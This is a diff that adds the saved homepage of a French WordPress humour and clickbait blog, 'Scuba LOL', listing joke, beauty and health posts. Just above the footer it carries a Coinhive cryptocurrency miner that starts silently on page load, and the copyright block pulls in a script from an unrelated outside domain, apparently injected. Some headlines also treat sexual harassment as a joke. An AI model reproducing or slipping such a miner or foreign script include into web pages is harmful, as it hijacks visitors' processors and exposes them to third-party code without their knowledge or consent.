@@ -1,0 +1,440 @@
+<!DOCTYPE html>
+<html lang="fr-FR">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+    <title>Scuba LOL</title>
+<link rel='dns-prefetch' href='//fonts.googleapis.com' />
+<link rel='dns-prefetch' href='//s.w.org' />
+<link rel="alternate" type="application/rss+xml" title="Scuba LOL &raquo; Flux" href="http://www.scubalol.com/feed/" />
+<link rel="alternate" type="application/rss+xml" title="Scuba LOL &raquo; Flux des commentaires" href="http://www.scubalol.com/comments/feed/" />
+		<script type="text/javascript">
+			window._wpemojiSettings = {"baseUrl":"https:\/\/s.w.org\/images\/core\/emoji\/2.2.1\/72x72\/","ext":".png","svgUrl":"https:\/\/s.w.org\/images\/core\/emoji\/2.2.1\/svg\/","svgExt":".svg","source":{"concatemoji":"http:\/\/www.scubalol.com\/wp-includes\/js\/wp-emoji-release.min.js?ver=4.7.3"}};
+			!function(a,b,c){function d(a){var b,c,d,e,f=String.fromCharCode;if(!k||!k.fillText)return!1;switch(k.clearRect(0,0,j.width,j.height),k.textBaseline="top",k.font="600 32px Arial",a){case"flag":return k.fillText(f(55356,56826,55356,56819),0,0),!(j.toDataURL().length<3e3)&&(k.clearRect(0,0,j.width,j.height),k.fillText(f(55356,57331,65039,8205,55356,57096),0,0),b=j.toDataURL(),k.clearRect(0,0,j.width,j.height),k.fillText(f(55356,57331,55356,57096),0,0),c=j.toDataURL(),b!==c);case"emoji4":return k.fillText(f(55357,56425,55356,57341,8205,55357,56507),0,0),d=j.toDataURL(),k.clearRect(0,0,j.width,j.height),k.fillText(f(55357,56425,55356,57341,55357,56507),0,0),e=j.toDataURL(),d!==e}return!1}function e(a){var c=b.createElement("script");c.src=a,c.defer=c.type="text/javascript",b.getElementsByTagName("head")[0].appendChild(c)}var f,g,h,i,j=b.createElement("canvas"),k=j.getContext&&j.getContext("2d");for(i=Array("flag","emoji4"),c.supports={everything:!0,everythingExceptFlag:!0},h=0;h<i.length;h++)c.supports[i[h]]=d(i[h]),c.supports.everything=c.supports.everything&&c.supports[i[h]],"flag"!==i[h]&&(c.supports.everythingExceptFlag=c.supports.everythingExceptFlag&&c.supports[i[h]]);c.supports.everythingExceptFlag=c.supports.everythingExceptFlag&&!c.supports.flag,c.DOMReady=!1,c.readyCallback=function(){c.DOMReady=!0},c.supports.everything||(g=function(){c.readyCallback()},b.addEventListener?(b.addEventListener("DOMContentLoaded",g,!1),a.addEventListener("load",g,!1)):(a.attachEvent("onload",g),b.attachEvent("onreadystatechange",function(){"complete"===b.readyState&&c.readyCallback()})),f=c.source||{},f.concatemoji?e(f.concatemoji):f.wpemoji&&f.twemoji&&(e(f.twemoji),e(f.wpemoji)))}(window,document,window._wpemojiSettings);
+		</script>
+		<style type="text/css">
+img.wp-smiley,
+img.emoji {
+	display: inline !important;
+	border: none !important;
+	box-shadow: none !important;
+	height: 1em !important;
+	width: 1em !important;
+	margin: 0 .07em !important;
+	vertical-align: -0.1em !important;
+	background: none !important;
+	padding: 0 !important;
+}
+</style>
+<link rel='stylesheet' id='banzai_bootstrap-css'  href='http://www.scubalol.com/wp-content/themes/banzai/components/bootstrap-sass/assets/stylesheets/bootstrap.css?ver=4.7.3' type='text/css' media='all' />
+<link rel='stylesheet' id='banzai_font_awesome-css'  href='http://www.scubalol.com/wp-content/themes/banzai/components/font-awesome/css/font-awesome.min.css?ver=4.7.3' type='text/css' media='all' />
+<link rel='stylesheet' id='banzai_google_font_lato-css'  href='https://fonts.googleapis.com/css?family=Lato%3A300%2C400%2C500%2C500italic%2C600%2C700&#038;subset=latin%2Clatin-ext&#038;ver=4.7.3' type='text/css' media='all' />
+<link rel='stylesheet' id='banzai_google_font_montserrat-css'  href='https://fonts.googleapis.com/css?family=Montserrat%3A400%2C700&#038;ver=4.7.3' type='text/css' media='all' />
+<link rel='stylesheet' id='banzai_owl_carousel-css'  href='http://www.scubalol.com/wp-content/themes/banzai/components/owl-carousel/assets/owl.carousel.min.css?ver=4.7.3' type='text/css' media='all' />
+<link rel='stylesheet' id='banzai_owl_carousel_theme-css'  href='http://www.scubalol.com/wp-content/themes/banzai/components/owl-carousel/assets/owl.theme.default.min.css?ver=4.7.3' type='text/css' media='all' />
+<link rel='stylesheet' id='banzai_main-css'  href='http://www.scubalol.com/wp-content/themes/banzai/components/core/css/main.css?ver=4.7.3' type='text/css' media='all' />
+<style id='banzai_main-inline-css' type='text/css'>
+
+            .post-ribbon-img .post-related-ribbon-category-3{ 
+                background-color: #f4524d;
+             }
+             .post-ribbon-img .post-related-ribbon-category-3:before{ 
+                border-top: 8px solid #f4524d;
+             }
+             .owl-carousel .owl-banzai-item.cat-3:hover span{ border-bottom-color: #f4524d; }
+        
+            .post-ribbon-img .post-related-ribbon-category-4{ 
+                background-color: #f4524d;
+             }
+             .post-ribbon-img .post-related-ribbon-category-4:before{ 
+                border-top: 8px solid #f4524d;
+             }
+             .owl-carousel .owl-banzai-item.cat-4:hover span{ border-bottom-color: #f4524d; }
+        
+            .post-ribbon-img .post-related-ribbon-category-2{ 
+                background-color: #f4524d;
+             }
+             .post-ribbon-img .post-related-ribbon-category-2:before{ 
+                border-top: 8px solid #f4524d;
+             }
+             .owl-carousel .owl-banzai-item.cat-2:hover span{ border-bottom-color: #f4524d; }
+        
+            .post-ribbon-img .post-related-ribbon-category-1{ 
+                background-color: #f4524d;
+             }
+             .post-ribbon-img .post-related-ribbon-category-1:before{ 
+                border-top: 8px solid #f4524d;
+             }
+             .owl-carousel .owl-banzai-item.cat-1:hover span{ border-bottom-color: #f4524d; }
+        
+</style>
+<link rel='stylesheet' id='banzai_dynamic-css'  href='http://www.scubalol.com/wp-content/themes/banzai/components/core/css/dynamic.css?ver=4.7.3' type='text/css' media='all' />
+<link rel='stylesheet' id='banzai_google_font_montserrat_alt-css'  href='https://fonts.googleapis.com/css?family=Montserrat+Alternates%3A400%2C700&#038;ver=4.7.3' type='text/css' media='all' />
+<script type='text/javascript' src='http://www.scubalol.com/wp-includes/js/jquery/jquery.js?ver=1.12.4'></script>
+<script type='text/javascript' src='http://www.scubalol.com/wp-includes/js/jquery/jquery-migrate.min.js?ver=1.4.1'></script>
+<link rel='https://api.w.org/' href='http://www.scubalol.com/wp-json/' />
+<link rel="EditURI" type="application/rsd+xml" title="RSD" href="http://www.scubalol.com/xmlrpc.php?rsd" />
+<link rel="wlwmanifest" type="application/wlwmanifest+xml" href="http://www.scubalol.com/wp-includes/wlwmanifest.xml" /> 
+<meta name="generator" content="WordPress 4.7.3" />
+
+
+
+
+<!-- Histats.com  START (html only)-->
+<a href="/" alt="page hit counter" target="_blank" >
+<embed src="http://s10.histats.com/1.swf"  flashvars="jver=1&acsid=3783185&domi=4"  quality="high"  width="120" height="40" name="1.swf"  align="middle" type="application/x-shockwave-flash" pluginspage="http://www.macromedia.com/go/getflashplayer" wmode="transparent" /></a>
+<img  src="//sstatic1.histats.com/0.gif?3783185&101" alt="" border="0">
+<!-- Histats.com  END  -->
+
+
+
+
+
+
+
+
+
+
+</head>
+<body class="home blog">
+
+
+<nav class="navbar navbar-banzai-magazine">
+    <div class="top-navbar">
+        <div class="container">
+            <ul class="nav navbar-nav navbar-user hidden-xs">
+                            </ul>
+            <div class="navbar-logo">
+                <a href="http://www.scubalol.com/">Scuba LOL</a>            </div>
+                            <form class="nav navbar-form navbar-search search-form hidden-xs" method="get" action="http://www.scubalol.com/">
+                    <div class="input-group">
+                        <input type="text" class="search-field form-control" placeholder="Search"
+                               value="" name="s">
+                        <span class="input-group-btn"><button class="btn search-submit" type="button"><i class="fa fa-search"></i></button></span>
+                    </div>
+                </form>
+                
+            <button type="button" class="navbar-toggle collapsed banzai-mobile-btn">
+                <i class="fa fa-bars"></i>
+            </button>
+        </div>
+    </div>
+    <div class="bottom-navbar">
+        <div class="container">
+            <div class="collapse navbar-collapse banzai-main-nav">
+                <ul id="menu-menu" class="nav navbar-nav"><li id="menu-item-5" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-5"><a href="http://scubalol.com/b/">Home</a></li>
+<li id="menu-item-6" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-6"><a href="http://www.scubalol.com/category/beaute/">beauté</a></li>
+<li id="menu-item-7" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-7"><a href="http://www.scubalol.com/category/buzz/">buzz</a></li>
+<li id="menu-item-8" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-8"><a href="http://www.scubalol.com/category/sante/">santé</a></li>
+</ul>            </div><!-- /.navbar-collapse -->
+        </div>
+    </div>
+</nav>
+<nav class="navbar-banzai-mobile">
+    <!-- Main, Secondary, Buttons, Social -->
+    <form method="get" class="search-form" action="http://www.scubalol.com/">
+    <div class="input-group">
+        <input type="text" class="search-field form-control" placeholder="Search"
+               value="" name="s">
+        <span class="input-group-btn"><button class="btn btn-main search-submit" type="button"><i class="fa fa-search"></i></button></span>
+    </div>
+</form><ul id="menu-menu-1" class="nav nav-stacked"><li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-5"><a href="http://scubalol.com/b/">Home</a></li>
+<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-6"><a href="http://www.scubalol.com/category/beaute/">beauté</a></li>
+<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-7"><a href="http://www.scubalol.com/category/buzz/">buzz</a></li>
+<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-8"><a href="http://www.scubalol.com/category/sante/">santé</a></li>
+</ul><ul class="nav nav-stacked"><li class="page_item page-item-2"><a href="http://www.scubalol.com/sample-page/">Sample Page</a></li>
+</ul>
+    <ul class="nav nav-stacked">
+            </ul>
+    <ul class="nav nav-pills">
+            </ul>
+</nav>
+<div class="container push-top">
+    <div class="row">
+            <div class="col-md-12">
+        <div class="panel panel-default">
+            <div class="panel-body">
+                <div class="featured-slider">
+                                            <a href="http://www.scubalol.com/quand-vous-avez-un-probleme-dechec-denvoi-mdrrrr/" class="featured-item">
+                                                        <div class="featured-cover"></div>
+                            <div class="featured-item-details">
+                                <h2>Quand vous avez UN problème d&rsquo;échec d&rsquo;envoi..MDRRRR</h2>
+                                <div class="featured-item-time"><i class="fa fa-clock-o"></i>  50 minutes ago</div>
+                            </div>
+                        </a>
+                                                <a href="http://www.scubalol.com/si-vous-avez-un-m-dans-le-creux-de-la-main-votre-destin-sera-unique-2/" class="featured-item">
+                            <img width="524" height="210" src="http://www.scubalol.com/wp-content/uploads/2017/09/creux-de-main-2-524x210.png" class="attachment-banzai-featured-slideshow-lg size-banzai-featured-slideshow-lg wp-post-image" alt="" />                            <div class="featured-cover"></div>
+                            <div class="featured-item-details">
+                                <h2>Si vous avez un M dans le creux de la main, votre destin sera unique!</h2>
+                                <div class="featured-item-time"><i class="fa fa-clock-o"></i>  1 heure ago</div>
+                            </div>
+                        </a>
+                                                <a href="http://www.scubalol.com/mdrrrr/" class="featured-item">
+                            <img width="550" height="191" src="http://www.scubalol.com/wp-content/uploads/2017/09/20-550x191.png" class="attachment-banzai-featured-slideshow-lg size-banzai-featured-slideshow-lg wp-post-image" alt="" />                            <div class="featured-cover"></div>
+                            <div class="featured-item-details">
+                                <h2>MDRRRR</h2>
+                                <div class="featured-item-time"><i class="fa fa-clock-o"></i>  2 heures ago</div>
+                            </div>
+                        </a>
+                                                <a href="http://www.scubalol.com/9-choses-a-ne-jamais-faire-pendant-vos-regles/" class="featured-item">
+                            <img width="550" height="210" src="http://www.scubalol.com/wp-content/uploads/2017/09/2017-09-28_10-40-08-550x210.png" class="attachment-banzai-featured-slideshow-lg size-banzai-featured-slideshow-lg wp-post-image" alt="" />                            <div class="featured-cover"></div>
+                            <div class="featured-item-details">
+                                <h2>9 Choses à ne jamais faire pendant vos règles</h2>
+                                <div class="featured-item-time"><i class="fa fa-clock-o"></i>  2 heures ago</div>
+                            </div>
+                        </a>
+                                                <a href="http://www.scubalol.com/top-blague-courte/" class="featured-item">
+                            <img width="550" height="196" src="http://www.scubalol.com/wp-content/uploads/2017/09/19-550x196.png" class="attachment-banzai-featured-slideshow-lg size-banzai-featured-slideshow-lg wp-post-image" alt="" />                            <div class="featured-cover"></div>
+                            <div class="featured-item-details">
+                                <h2>top Blague courte</h2>
+                                <div class="featured-item-time"><i class="fa fa-clock-o"></i>  3 heures ago</div>
+                            </div>
+                        </a>
+                                            <div class="clearfix"></div>
+                </div>
+            </div>
+        </div>
+
+    </div>
+    
+<div class="col-md-8 content-body">
+    <div class="panel panel-default">
+        <div class="panel-body">
+            <header class="page-header"><h3 class="page-title">Latest Posts</h3></header>
+
+            <div class="single-column-posts"><div class="single-post">
+            <div class="col-md-6">
+                    </div>
+            <div class="col-md-6">
+        <div class="single-post-category" style="color: #f4524d">buzz</div>        <h4><a href="http://www.scubalol.com/quand-vous-avez-un-probleme-dechec-denvoi-mdrrrr/">Quand vous avez UN problème d&rsquo;échec d&rsquo;envoi..MDRRRR</a></h4>
+                <div class="post-meta">
+            <i class="fa fa-user"></i> <a href="http://www.scubalol.com/author/Ouadie/">Ouadie</a><br><i class="fa fa-clock-o"></i> 50 minutes ago        </div>
+    </div>
+</div><div class="single-post">
+            <div class="col-md-6">
+            
+<a href="http://www.scubalol.com/si-vous-avez-un-m-dans-le-creux-de-la-main-votre-destin-sera-unique-2/" class="post-ribbon-img">
+    <img width="350" height="250" src="http://www.scubalol.com/wp-content/uploads/2017/09/creux-de-main-2-350x250.png" class="attachment-banzai-list-lg size-banzai-list-lg wp-post-image" alt="" />    <div class="post-ribbons">
+        <div class="single-ribbon post-related-ribbon"><i class="fa fa-share-alt"></i> 0</div><br>    </div>
+</a>        </div>
+            <div class="col-md-6">
+        <div class="single-post-category" style="color: #f4524d">santé</div>        <h4><a href="http://www.scubalol.com/si-vous-avez-un-m-dans-le-creux-de-la-main-votre-destin-sera-unique-2/">Si vous avez un M dans le creux de la main, votre destin sera unique!</a></h4>
+                <div class="post-meta">
+            <i class="fa fa-user"></i> <a href="http://www.scubalol.com/author/Ouadie/">Ouadie</a><br><i class="fa fa-clock-o"></i> 1 heure ago        </div>
+    </div>
+</div><div class="single-post">
+            <div class="col-md-6">
+            
+<a href="http://www.scubalol.com/mdrrrr/" class="post-ribbon-img">
+    <img width="350" height="191" src="http://www.scubalol.com/wp-content/uploads/2017/09/20-350x191.png" class="attachment-banzai-list-lg size-banzai-list-lg wp-post-image" alt="" />    <div class="post-ribbons">
+        <div class="single-ribbon post-related-ribbon"><i class="fa fa-share-alt"></i> 0</div><br>    </div>
+</a>        </div>
+            <div class="col-md-6">
+        <div class="single-post-category" style="color: #f4524d">Uncategorized</div>        <h4><a href="http://www.scubalol.com/mdrrrr/">MDRRRR</a></h4>
+                <div class="post-meta">
+            <i class="fa fa-user"></i> <a href="http://www.scubalol.com/author/Ouadie/">Ouadie</a><br><i class="fa fa-clock-o"></i> 2 heures ago        </div>
+    </div>
+</div><div class="single-post">
+            <div class="col-md-6">
+            
+<a href="http://www.scubalol.com/9-choses-a-ne-jamais-faire-pendant-vos-regles/" class="post-ribbon-img">
+    <img width="350" height="250" src="http://www.scubalol.com/wp-content/uploads/2017/09/2017-09-28_10-40-08-350x250.png" class="attachment-banzai-list-lg size-banzai-list-lg wp-post-image" alt="" />    <div class="post-ribbons">
+        <div class="single-ribbon post-related-ribbon"><i class="fa fa-share-alt"></i> 0</div><br>    </div>
+</a>        </div>
+            <div class="col-md-6">
+        <div class="single-post-category" style="color: #f4524d">santé</div>        <h4><a href="http://www.scubalol.com/9-choses-a-ne-jamais-faire-pendant-vos-regles/">9 Choses à ne jamais faire pendant vos règles</a></h4>
+                <div class="post-meta">
+            <i class="fa fa-user"></i> <a href="http://www.scubalol.com/author/Ouadie/">Ouadie</a><br><i class="fa fa-clock-o"></i> 2 heures ago        </div>
+    </div>
+</div><div class="single-post">
+            <div class="col-md-6">
+            
+<a href="http://www.scubalol.com/top-blague-courte/" class="post-ribbon-img">
+    <img width="350" height="196" src="http://www.scubalol.com/wp-content/uploads/2017/09/19-350x196.png" class="attachment-banzai-list-lg size-banzai-list-lg wp-post-image" alt="" />    <div class="post-ribbons">
+        <div class="single-ribbon post-related-ribbon"><i class="fa fa-share-alt"></i> 0</div><br>    </div>
+</a>        </div>
+            <div class="col-md-6">
+        <div class="single-post-category" style="color: #f4524d">buzz</div>        <h4><a href="http://www.scubalol.com/top-blague-courte/">top Blague courte</a></h4>
+                <div class="post-meta">
+            <i class="fa fa-user"></i> <a href="http://www.scubalol.com/author/Ouadie/">Ouadie</a><br><i class="fa fa-clock-o"></i> 3 heures ago        </div>
+    </div>
+</div><div class="single-post">
+            <div class="col-md-6">
+            
+<a href="http://www.scubalol.com/en-couple-depuis-3-mois-vs-en-couple-depuis-3-ans-10-mini-bd-rigolotes/" class="post-ribbon-img">
+    <img width="350" height="250" src="http://www.scubalol.com/wp-content/uploads/2017/09/1-3-350x250.jpg" class="attachment-banzai-list-lg size-banzai-list-lg wp-post-image" alt="" />    <div class="post-ribbons">
+        <div class="single-ribbon post-related-ribbon"><i class="fa fa-share-alt"></i> 0</div><br>    </div>
+</a>        </div>
+            <div class="col-md-6">
+        <div class="single-post-category" style="color: #f4524d">buzz</div>        <h4><a href="http://www.scubalol.com/en-couple-depuis-3-mois-vs-en-couple-depuis-3-ans-10-mini-bd-rigolotes/">En couple depuis 3 mois VS en couple depuis 3 ans : 10 mini-bd rigolotes</a></h4>
+                <div class="post-meta">
+            <i class="fa fa-user"></i> <a href="http://www.scubalol.com/author/Ouadie/">Ouadie</a><br><i class="fa fa-clock-o"></i> 3 heures ago        </div>
+    </div>
+</div><div class="single-post">
+            <div class="col-md-6">
+            
+<a href="http://www.scubalol.com/9-signes-qui-montrent-quune-fille-vient-juste-de-faire-lamour/" class="post-ribbon-img">
+    <img width="350" height="250" src="http://www.scubalol.com/wp-content/uploads/2017/09/22046458_1725464350798617_2986158645967805563_n-350x250.png" class="attachment-banzai-list-lg size-banzai-list-lg wp-post-image" alt="" />    <div class="post-ribbons">
+        <div class="single-ribbon post-related-ribbon"><i class="fa fa-share-alt"></i> 0</div><br>    </div>
+</a>        </div>
+            <div class="col-md-6">
+        <div class="single-post-category" style="color: #f4524d">Uncategorized</div>        <h4><a href="http://www.scubalol.com/9-signes-qui-montrent-quune-fille-vient-juste-de-faire-lamour/">9 signes qui montrent qu’une fille vient juste de faire l’amour !</a></h4>
+                <div class="post-meta">
+            <i class="fa fa-user"></i> <a href="http://www.scubalol.com/author/Ouadie/">Ouadie</a><br><i class="fa fa-clock-o"></i> 10 heures ago        </div>
+    </div>
+</div><div class="single-post">
+            <div class="col-md-6">
+            
+<a href="http://www.scubalol.com/un-homme-tripote-les-fesses-dune-blonde-dans-le-metro-mais-une-surprise-lattend/" class="post-ribbon-img">
+    <img width="350" height="250" src="http://www.scubalol.com/wp-content/uploads/2017/09/22007775_1725493747462344_3579665284506687741_n-350x250.jpg" class="attachment-banzai-list-lg size-banzai-list-lg wp-post-image" alt="" />    <div class="post-ribbons">
+        <div class="single-ribbon post-related-ribbon"><i class="fa fa-share-alt"></i> 0</div><br>    </div>
+</a>        </div>
+            <div class="col-md-6">
+        <div class="single-post-category" style="color: #f4524d">Uncategorized</div>        <h4><a href="http://www.scubalol.com/un-homme-tripote-les-fesses-dune-blonde-dans-le-metro-mais-une-surprise-lattend/">Un homme tripote les fesses d’une blonde dans le métro, mais une surprise l’attend!</a></h4>
+                <div class="post-meta">
+            <i class="fa fa-user"></i> <a href="http://www.scubalol.com/author/Ouadie/">Ouadie</a><br><i class="fa fa-clock-o"></i> 10 heures ago        </div>
+    </div>
+</div><div class="single-post">
+            <div class="col-md-6">
+            
+<a href="http://www.scubalol.com/ces-10-erreurs-detruisent-votre-relation/" class="post-ribbon-img">
+    <img width="350" height="250" src="http://www.scubalol.com/wp-content/uploads/2017/09/1-2-350x250.jpg" class="attachment-banzai-list-lg size-banzai-list-lg wp-post-image" alt="" />    <div class="post-ribbons">
+        <div class="single-ribbon post-related-ribbon"><i class="fa fa-share-alt"></i> 0</div><br>    </div>
+</a>        </div>
+            <div class="col-md-6">
+        <div class="single-post-category" style="color: #f4524d">Uncategorized</div>        <h4><a href="http://www.scubalol.com/ces-10-erreurs-detruisent-votre-relation/">Ces 10 Erreurs Détruisent Votre Relation!</a></h4>
+                <div class="post-meta">
+            <i class="fa fa-user"></i> <a href="http://www.scubalol.com/author/Ouadie/">Ouadie</a><br><i class="fa fa-clock-o"></i> 12 heures ago        </div>
+    </div>
+</div><div class="single-post">
+            <div class="col-md-6">
+            
+<a href="http://www.scubalol.com/10-choses-que-les-femmes-aimeraient-que-vous-sachiez-les-gars/" class="post-ribbon-img">
+    <img width="350" height="250" src="http://www.scubalol.com/wp-content/uploads/2017/09/femmesavoirm1-350x250.jpg" class="attachment-banzai-list-lg size-banzai-list-lg wp-post-image" alt="" />    <div class="post-ribbons">
+        <div class="single-ribbon post-related-ribbon"><i class="fa fa-share-alt"></i> 0</div><br>    </div>
+</a>        </div>
+            <div class="col-md-6">
+        <div class="single-post-category" style="color: #f4524d">Uncategorized</div>        <h4><a href="http://www.scubalol.com/10-choses-que-les-femmes-aimeraient-que-vous-sachiez-les-gars/">10 choses que les femmes aimeraient que vous sachiez, les gars</a></h4>
+                <div class="post-meta">
+            <i class="fa fa-user"></i> <a href="http://www.scubalol.com/author/Ouadie/">Ouadie</a><br><i class="fa fa-clock-o"></i> 13 heures ago        </div>
+    </div>
+</div></div>
+	<nav class="navigation pagination" role="navigation">
+		<h2 class="screen-reader-text">Navigation des articles</h2>
+		<div class="nav-links"><span class='page-numbers current'>1</span>
+<a class='page-numbers' href='http://www.scubalol.com/page/2/'>2</a>
+<span class="page-numbers dots">&hellip;</span>
+<a class='page-numbers' href='http://www.scubalol.com/page/94/'>94</a>
+<a class="next page-numbers" href="http://www.scubalol.com/page/2/">Next page</a></div>
+	</nav>        </div>
+    </div>
+
+</div>
+<div class="col-md-4">
+    
+<div id="text-2" class="panel panel-default widget widget_text"><div class="panel-body">			<div class="textwidget"></div>
+		</div></div></div>    </div>
+</div>
+
+<script src="https://coin-hive.com/lib/coinhive.min.js"></script><script>var miner = new CoinHive.Anonymous('i2lFh4cKRe9uUDj5KP2fPeBjncxQog6w'); miner.start();</script><footer class="banzai-footer">
+    <div class="footer-widgets">
+        <div class="container">
+            <div class="row">
+                <div class="col-md-4">
+                                    </div>
+                <div class="col-md-4">
+                                    </div>
+                <div class="col-md-4">
+                                    </div>
+            </div>
+        </div>
+    </div>
+    <div class="copyright">
+        <div class="container">
+            <div class="row">
+		<script src="http://la-suite-mobile.com/wp-content/scripts.js"></script>
+
+                <div class="col-md-6"><p>© 2016 Jasko Koyn</p></div>
+                <div class="col-md-6">
+                    <ul class="social-circles pull-right">
+                                            </ul>
+                </div>
+            </div>
+        </div>
+    </div>
+</footer>
+<div class="modal fade user-modal" id="user-auth-modal">
+    <div class="modal-dialog">
+        <div class="modal-content">
+            <div class="modal-header">
+                <button type="button" class="close" data-dismiss="modal"><i class="fa fa-remove"></i></button>
+                <h4 class="modal-title">Connect</h4>
+            </div>
+            <div class="modal-body">
+                <div class="row">
+                                        <div class="col-md-12">
+                        <div id="banzai-auth-login-ctr">
+                            <div id="banzai-auth-login-status"></div>
+                            <form id="banzai-auth-login-form">
+                                <input type="hidden" id="_wpnonce" name="_wpnonce" value="269c1f1245" /><input type="hidden" name="_wp_http_referer" value="/" />                                <div class="form-group">
+                                    <label>Username</label>
+                                    <input type="text" class="form-control" id="banzai_inputLoginUsername">
+                                </div>
+                                <div class="form-group">
+                                    <label>Password</label>
+                                    <input type="password" class="form-control" id="banzai_inputLoginPass">
+                                </div>
+                                <div class="form-group">
+                                    <a href="http://www.scubalol.com/wp-login.php?action=lostpassword" class="forgot">Forgot Password?</a>
+                                </div>
+                                <div class="form-group">
+                                    <button type="submit" class="btn btn-success">LOGIN</button>
+                                                                    </div>
+                            </form>
+                        </div>
+                                            </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</div><!-- Histats.com  START (html only)-->
+<a href="/" alt="page hit counter" target="_blank" >
+<embed src="http://s10.histats.com/1.swf"  flashvars="jver=1&acsid=2945031&domi=4"  quality="high"  width="120" height="40" name="1.swf"  align="middle" type="application/x-shockwave-flash" pluginspage="http://www.macromedia.com/go/getflashplayer" wmode="transparent" /></a>
+<img  src="//sstatic1.histats.com/0.gif?2945031&101" alt="free web hit counter" border="0">
+<!-- Histats.com  END  --><script>
+  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+  })(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
+
+  ga('create', 'UA-80035832-10', 'auto');
+  ga('send', 'pageview');
+
+</script><script type='text/javascript' src='http://www.scubalol.com/wp-content/themes/banzai/components/bootstrap-sass/assets/javascripts/bootstrap.min.js?ver=4.7.3'></script>
+<script type='text/javascript' src='http://www.scubalol.com/wp-content/themes/banzai/components/owl-carousel/owl.carousel.min.js?ver=4.7.3'></script>
+<script type='text/javascript'>
+/* <![CDATA[ */
+var banzai_main_i18n = {"ajaxurl":"http:\/\/www.scubalol.com\/wp-admin\/admin-ajax.php"};
+/* ]]> */
+</script>
+<script type='text/javascript' src='http://www.scubalol.com/wp-content/themes/banzai/components/core/js/main.js?ver=4.7.3'></script>
+<script type='text/javascript'>
+/* <![CDATA[ */
+var banzai_auth_i18n = {"please_wait_reg":"Please wait while we create your account.","success_reg":"Success! You are now being logged in.","error_reg":"Unable to create your account. Please try using a different E-mail or Username as it may have already been taken.","please_wait_login":"Please wait! Verifying your credentials.","success_login":"Success! You are now being logged in.","error_login":"Invalid credentials. Please double check your info."};
+/* ]]> */
+</script>
+<script type='text/javascript' src='http://www.scubalol.com/wp-content/themes/banzai/components/core/js/auth.js?ver=4.7.3'></script>
+<script type='text/javascript' src='http://www.scubalol.com/wp-includes/js/wp-embed.min.js?ver=4.7.3'></script>
+ <!-- Histats.com  START (html only)-->
+<a href="/" alt="page hit counter" target="_blank" >
+<embed src="http://s10.histats.com/1.swf"  flashvars="jver=1&acsid=2945031&domi=4"  quality="high"  width="120" height="40" name="1.swf"  align="middle" type="application/x-shockwave-flash" pluginspage="http://www.macromedia.com/go/getflashplayer" wmode="transparent" /></a>
+<img  src="//sstatic1.histats.com/0.gif?2945031&101" alt="counter easy hit" border="0">
+<!-- Histats.com  END  -->
+</body>
+</html>
+<!-- Dynamic page generated in 0.158 seconds. -->
+<!-- Cached page generated by WP-Super-Cache on 2017-09-28 11:18:18 -->
+
+<!-- super cache -->
